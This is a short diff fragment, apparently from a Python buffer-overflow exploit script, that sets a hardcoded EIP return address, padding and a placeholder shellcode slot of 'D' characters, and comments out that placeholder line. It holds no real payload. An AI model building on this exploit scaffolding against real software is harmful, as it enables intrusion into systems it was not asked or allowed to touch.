@@ -16,7 +16,7 @@ try:
     eip = "\x83\x0C\x09\x10"
     buffer = "C" * 4
     # nops = "\x90" * 10
-    shellcode = (1500 - len(filler) - len(eip) - len(buffer)) * "D"
+    # shellcode = (1500 - len(filler) - len(eip) - len(buffer)) * "D"
 
 
 
